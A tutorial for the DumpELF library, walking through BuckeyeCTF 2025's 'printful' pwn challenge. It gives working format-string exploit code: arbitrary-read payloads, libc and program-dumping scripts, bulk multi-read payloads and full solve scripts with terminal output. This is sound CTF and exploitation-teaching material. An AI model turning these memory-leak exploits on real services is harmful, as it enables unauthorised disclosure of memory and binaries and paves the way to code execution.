# DumpELF
As a walkthrough, I will be showing how to use DumpELF on a real CTF challenge.  
The one I'll pick is [printful](https://github.com/cscosu/buckeyectf-2025-public/blob/master/pwn/printful/README.md), a pwn challenge from BuckeyeCTF 2025 with a very simple description:
```
# printful

No files... 🙃
nc xxxx.pwnoh.io <port>
```
No files! Only a port. Fun.

Upon connecting, we're met with a simple interface that is, you guessed it, an infinite loop format string bug:
```
corgo@dog-computer:~$ nc localhost 1024
Welcome to printful! Enter 'q' to quit
> hi
hi
> test
test
> %p!%p
0x57110fc9a00b!0x71
>
```

This gives us an arbitrary read (`%s`) and write (`%n`), but obviously without any kind of information about the environment we won't be able to do much. This is where DumpELF comes in! 

# libc dumping

First, we define a function that sends a line and returns its exact output:
```python
def do(payload):
    p.sendline(payload)
    return p.recv().removesuffix(b"> ")
```
next, we use this to write a function that reads the bytes at `addr` using the format string bug:
```python
def dump_string(addr):
    if b"\n" in p64(addr):
        return b"\0"
    payload = b"%7$s".ljust(8, b"\x00") + p64(addr)
    return do(payload)+b'\x00' # null terminator
```
and that's all we have to do! We can now hook this up to DumpELF to leak the remote's libc/ld:
```python
#!/usr/bin/env python3

from dog import *

def do(payload):
    p.sendline(payload)
    return p.recv().removesuffix(b"> ")

def dump_string(addr):
    if b"\n" in p64(addr):
        return b"\0"
    payload = b"%7$s".ljust(8, b"\x00") + p64(addr)
    return do(payload)+b'\x00'

p = set_alias(remote("localhost",1024))
p.recvuntil(b"> ")

pie_leak = int(do(b"%p"), 16)
logx(pie_leak)

fun = DumpELF(dump_string,pie_leak)
libc = fun.libc
logx(libc.path)
```
we run this a few times (because we can't easily print addresses with `\n` in the name) until we get:
```bash
corgo@dog-computer:~/pwn/buckeye/printful$ python3 ./solve2.py
[+] Opening connection to localhost on port 1024: Done
[*] pie_leak=0x5969aa2d000b
[+] Downloading 'https://libc.rip/download/libc6_2.31-0ubuntu9.18_amd64.so': 1.94MB
[*] libc.path='/home/corgo/.cache/.pwntools-cache-3.12/libcdb/build_id/5792732f783158c66fb4f3756458ca24e46e827d'
[*] Closed connection to localhost port 1024
corgo@dog-computer:~/pwn/buckeye/printful$ cp /home/corgo/.cache/.pwntools-cache-3.12/libcdb/build_id/5792* ./libc.so.6
corgo@dog-computer:~/pwn/buckeye/printful$ dog fetch ./libc.so.6 --dbg # find and grab ld
/home/corgo/pwn/buckeye/printful/ld-2.31.so
[+] Debug symbols applied to ld '/home/corgo/pwn/buckeye/printful/ld-2.31.so'.
corgo@dog-computer:~/pwn/buckeye/printful$ ls ./libc.so.6 ./ld-2.31.so
./ld-2.31.so  ./libc.so.6
```
Just like that, we've retrieved the server's remote libc/ld! With this information, we can use the format string bug to overwrite something important in libc's memory and [get code execution](https://github.com/nobodyisnobody/docs/tree/main/code.execution.on.last.libc).  
All of this has been mostly possible with pwntools already, and it's probably not what you came here for, so let's move onto the thing it doesn't do: dumping the program.

# program dumping
This one is much harder. Dumping the program involves getting over two hurdles:
- It's much faster to leak libc/ld-- we leak something identifiable like its build ID, then look that up on something like [libc.rip](https://libc.rip). This is a completely unique program, so this isn't possible.
- An ELF loaded in memory is much different than it is on disk-- only the parts necessary for the program to run are loaded, meaning multiple critical sections simply do not exist in memory.

DumpELF tries to solve the second problem for you with a best-attempt reconstruction, but the first is on us.  

We could go ahead with using `dump_string` to try and fully dump the program, but against a real server this would likely take well over an hour. ELFs are mostly null bytes, and since our leak ends on an null byte, DumpELF needs about *18 thousand* calls to `dump_string` to get enough information. We need to find a way to leak *significantly* more data per round-trip against the server.

From here, I'll go over two solutions to this that both independently reduce the amount of calls by ~8x.  

## arb read improvement
The first thing you should do is to try and improve your arbitrary read, if you can. 
For us, we can fix this by sending multiple `%s` at once, all trying to read `addr+1`, `addr+2`, `addr+3` and so on. This significantly helps dump areas with heavy amounts of null bytes.  
While `pwntools` doesn't currently have something for this, `doglib` does under `FmtStrReader`:
```python
def do(payload):
    assert len(payload) < 256
    p.sendline(payload)
    return p.recv().removesuffix(b"> ")

def dofmt(payload):
    assert len(payload) < 256
    p.sendline(payload)
    return p.recvuntil(b'FMTLKEND')+p.recv().removesuffix(b"> ")

# consistently dump 8 bytes at 'addr'
def dump_qword(addr):
    # 6 is the first offset our input shows up at
    x = FmtStrReader(6,badchars=b'\n')
    pl = x.payload(addr,8)
    out = dofmt(pl) # send payload, get response
    return x.parse(out) # send response to .parse() to get correct bytes back

pie_leak = int(do(b"%p"), 16)
logx(pie_leak)
fun = DumpELF(dump_qword,pie_leak)
fun.dump("./printful.bin") # attempted ELF dump
```
Behind the scenes, `pl` looks something like:
```bash
FMTLKSTART%35$sFMTLKDLM%36$sFMTLKDLM%37$sFMTLKDLM%38$sFMTLKDLM%39$sFMTLKDLM%40$sFMTLKDLM%41$sFMTLKDLM%42$sFMTLKEND
```
where each format specifier has the unique string `FMTLKDLM` between them. That means when we recieve the format string's output, `.parse()` can split it on said delimiter and determine exactly what each `%s` leaked. If there is nothing between two delimiters, then we know there was a null byte at that address. There is some more advanced stuff we have to do (mostly dealing with bad character requirements) but that's the TLDR.  
Anyways, this optimization significantly increases our speed from about ~18k calls down to ~2k. With this function, we can give DumpELF a try.  
DumpELF will use `dump_qword` to dump all the necessary bytes of the ELF, *attempt* (this is difficult) to reconstruct the original ELF, then write it to `./printful.bin`. Let's give it a shot!
```bash
corgo@dog-computer:~/pwn/buckeye/printful$ python3 ./solve2.py
[+] Opening connection to localhost on port 1024: Done
[*] pie_leak=0x59270f69c00b
[*] Closed connection to localhost port 1024
corgo@dog-computer:~/pwn/buckeye/printful$ pwnc patch --interp ./ld-2.31.so --rpath '$ORIGIN' ./printful.bin ./patch.bin
corgo@dog-computer:~/pwn/buckeye/printful$ chmod +x ./patch.bin
corgo@dog-computer:~/pwn/buckeye/printful$ ./patch.bin
Welcome to printful! Enter 'q' to quit
> %p! %p! %p! %p! %p! %p!
0x62fa9212100b! 0x71! 0xffff7fff! 0x7ffc02ee38b0! (nil)! 0x2021702520217025!

corgo@dog-computer:~/pwn/buckeye/printful$ nc localhost 1024
Welcome to printful! Enter 'q' to quit
> %p! %p! %p! %p! %p! %p!
0x597d63b0600b! 0x71! 0xffff7fff! 0x7ffeabc97df0! (nil)! 0x2021702520217025!
>
```
Would you look at that. We've perfectly recovered the program!

### bulk writes
Of course, the above optimization is not always possible, or it may not be enough for your situation. DumpELF offers a second idea: bulk writes. The idea is that you can likely trigger the arbitrary read multiple times in a single .send():
```python
>>> from dog import *
>>> p = process("./printful")
[x] Starting local process './printful'
[+] Starting local process './printful': pid 2114
>>> p.send(b"(%p)\n(%p)\n")
>>> p.recv()
b"Welcome to printful! Enter 'q' to quit\n> (0x6160ce3e500b)\n> (0x6160ce3e500b)\n> "
>>>
```
This can be used to *massively* reduce latency, because you're not waiting for server to respond to send your next payload anymore-- you're just sending a bunch at once, then parsing all the responses later.  
Of course, since you can now read a semi-arbitrary amount of bytes, you might want to know just how much you should read. To solve this, pass `bulk=True` to DumpELF like so:
```python
fun = DumpELF(bulk_dump,pie_leak, bulk=True)
```
Now the signature of `bulk_dump` is expected to be:
```python
def bulk_dump(addr,cnt):
    ...
```
where `addr` is the address we want to leak as before, and `cnt` is how many bytes DumpELF would *like* to read at that address. You can give less, you can give more, it's just a suggestion. `cnt` may be high, so I suggest capping it if your arbitrary read is relatively weak (like the one in this writeup):
```python
def bulk_dump(addr,cnt):
    cnt = min(0x50,cnt) # we can stabily leak 0x50 bytes at a time
    ...
```
Here's a correctly written `bulk_dump` for our situation:
```python
def domany(payload, amt):
    p.sendline(payload)
    leak = []
    for _ in range(amt):
        leak.append(p.recvuntil(b'FMTLKEND').removeprefix(b"> "))
    return leak

def bulkdump(addr, cnt):
    cnt = min(0x80, cnt)
    x = FmtStrReader(6,badchars=b'\n')
    payloads = b'\n'.join(x.payload(addr+i,8) for i in range(0,cnt,8))
    out = domany(payloads,cnt//8)
    return b''.join(x.parse(y) for y in out)
```
We haven't changed much from `dump_qword`, other than generating and sending multiple `FmtStrReader` payloads at once. The only thing worth mentioning is this code:
```python
for _ in range(amt):
    leak.append(p.recvuntil(b'FMTLKEND').removeprefix(b"> "))
```
The remote server will likely not send everything back at once. You should continue trying to read from the server until you get the amount of expected responses back. Here, since I sent `amt//8` format string payloads that each end with `FMTLKEND`, I keep asking for more data until `leak` contains exactly that many `FMTLKEND`s.  


With the ability to leak a near-arbitrary amount of data in a single .send(), your time-to-leak should drop significantly-- previously needing ~2000 calls from `dump_qword` to only 100 from `bulkdump`. Here's the full solution making use of bulk writes:
```python
#!/usr/bin/env python3
from dog import *
context.arch = 'amd64'

def do(payload):
    assert len(payload) < 256
    p.sendline(payload)
    return p.recv().removesuffix(b"> ")

def domany(payload, amt):
    p.sendline(payload)
    leak = []
    for _ in range(amt):
        leak.append(p.recvuntil(b'FMTLKEND').removeprefix(b"> "))
    return leak

def bulkdump(addr, cnt):
    cnt = min(0x80, cnt)
    x = FmtStrReader(6,badchars=b'\n')
    payloads = b'\n'.join(x.payload(addr+i,8) for i in range(0,cnt,8))
    out = domany(payloads,cnt//8)
    return b''.join(x.parse(y) for y in out)

# p = remote("localhost",1024)
p = process("./printful.bin")
p.recvuntil(b"> ")
leak = int(do(f"%p"), 16)

y = DumpELF(bulkdump, leak, bulk=True)
y.dump('./wewin.bin')
p.close() # PLIMB's up!
```
Hopefully you now understand how to correctly use this library!

# Final Notes
While this feature is pretty cool, I would only use it as a last-resort option where the original ELF is a NEED to solve the challenge. Leaking libc and performing some arbitrary write to RCE technique would've absolutely been enough to solve this challenge, I just used it as a testbed.  
If DumpELF fails to reconstruct the program after multiple tries, you can just try dumping all the memory you can leak to disk. It won't run, but IDA can load it (after some scolding) and the decompiler will still work. (Note that there won't be any function information and IDA will probably miss some!)  
If the two previous optimizations still aren't enough, you could *try* leaking the binary in multiple connections. I haven't tested this, it may completely break (especially on PIE binaries), but it's worth a shot.  

